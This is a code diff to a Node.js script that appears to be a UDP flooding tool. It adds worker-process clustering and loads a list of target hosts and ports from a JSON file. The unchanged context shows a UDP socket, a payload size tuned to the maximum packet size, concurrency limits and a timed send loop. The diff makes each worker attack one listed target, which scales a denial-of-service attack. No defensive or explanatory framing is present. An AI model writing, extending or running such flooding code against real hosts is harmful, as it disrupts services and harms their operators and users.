@@ -1,6 +1,9 @@
+const dgram = require('dgram')
+const cluster = require('cluster')
 const { sleep } = require('./sleep')
 const { REQ_DELAY, INTERVAL, MAX_CONCURRENT_REQUESTS } = require('./constants')
-const dgram = require('dgram')
+
+const urlList = require(process.env.URL_LIST || './list.json')
 const client = dgram.createSocket('udp4')
 
 // max size is 9216 otherwise EMSGSIZE error
@@ -61,6 +64,13 @@ const runner = async (host, port, CONCURRENT_REQUESTS, name) => {
       await sleep(REQ_DELAY)
     }
   }
+
+  console.log('Terminating...')
+  process.exit(0)
+}
+
+if (!cluster.isPrimary) {
+  runner(...urlList[parseInt(process.env.URL_LIST_IDX, 10)])
 }
 
 module.exports = { runner }
